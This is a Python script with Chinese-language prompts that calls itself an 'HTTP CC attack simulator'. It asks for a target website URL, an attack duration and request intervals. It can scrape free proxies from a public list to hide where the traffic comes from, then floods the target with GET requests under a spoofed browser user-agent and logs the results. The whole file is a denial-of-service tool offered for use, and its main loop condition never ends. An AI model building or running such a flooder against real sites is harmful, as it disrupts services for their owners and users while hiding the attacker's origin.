import sys
import time
import threading
import requests
import random
from colorama import Fore, Style, init
import logging

init(autoreset=True)

logging.basicConfig(filename='cc_attack_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def log(message):
    logging.info(message)

def fetch_proxies(url='http://www.89ip.cn/tqdl.html?num=100&address=&kill_address=&port=&kill_port=&isp=', retries=3, delay=3):
    for _ in range(retries):
        try:
            response = requests.get(url)
            response.raise_for_status()
            return [{'http': f"http://{line.split()[0]}:{line.split()[1]}", 'https': f"https://{line.split()[0]}:{line.split()[1]}"} for line in response.text.split('\n') if len(line.split()) == 2]
        except requests.RequestException as e:
            logging.error(f"获取代理IP失败: {e}")
            time.sleep(delay)
    return []

def get_user_input():
    print("欢迎使用HTTP CC攻击模拟器 bushi \n")

    print("正在加载，请稍候...")
    for i in range(11):
        sys.stdout.write(f'\r加载中... [{"#" * i + " " * (10 - i)}] {i * 10}%')
        sys.stdout.flush()
        time.sleep(0.5)
    sys.stdout.write('\n')

    url = input("\n请输入目标网站的URL（包括http://或https://）: ")
    while not url.startswith(("http://", "https://")):
        url = input("错误：请输入有效的URL（包括http://或https://）: ")

    try:
        duration = float(input("请输入攻击持续时间（秒）: "))
        if duration <= 0:
            raise ValueError
    except ValueError:
        print("错误：攻击持续时间必须是一个大于0的数字。")
        sys.exit(1)

    try:
        min_interval = float(input("请输入最小请求间隔（秒）: "))
        max_interval = float(input("请输入最大请求间隔（秒）: "))
        if min_interval >= max_interval:
            raise ValueError
    except ValueError:
        print("错误：最小请求间隔必须小于最大请求间隔，并且它们都必须是有效的数字。")
        sys.exit(1)

    use_proxies = input("是否使用代理IP？(y/n): ").lower().strip() == 'y'
    proxies = fetch_proxies() if use_proxies else None

    return url, duration, min_interval, max_interval, proxies

def cc_attack(url, duration, min_interval, max_interval, proxies=None):
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            proxy = random.choice(proxies) if proxies else None
            sleep_time = random.uniform(min_interval, max_interval)
            time.sleep(sleep_time)
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            response = requests.get(url, headers=headers, timeout=5, proxies=proxy)
            response.raise_for_status()
            log(f"已发送请求至 {url} 通过代理 {proxy}，状态码: {response.status_code}")
            print(f"{Fore.GREEN}请求成功！状态码: {response.status_code}{Style.RESET_ALL}")
        except requests.RequestException as e:
            log(f"请求失败: {e}")
            print(f"{Fore.RED}请求失败！{Style.RESET_ALL}")

def main():
    url, duration, min_interval, max_interval, proxies = get_user_input()

    print(f"\n开始攻击 {url} 持续时间 {duration} 秒...")
    print("按 Ctrl+C 可以随时停止攻击\n")

    try:
        threading.Thread(target=cc_attack, args=(url, duration, min_interval, max_interval, proxies)).start()
        while time.time() < time.time() + duration:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n攻击已终止。")

if __name__ == "__main__":
    main()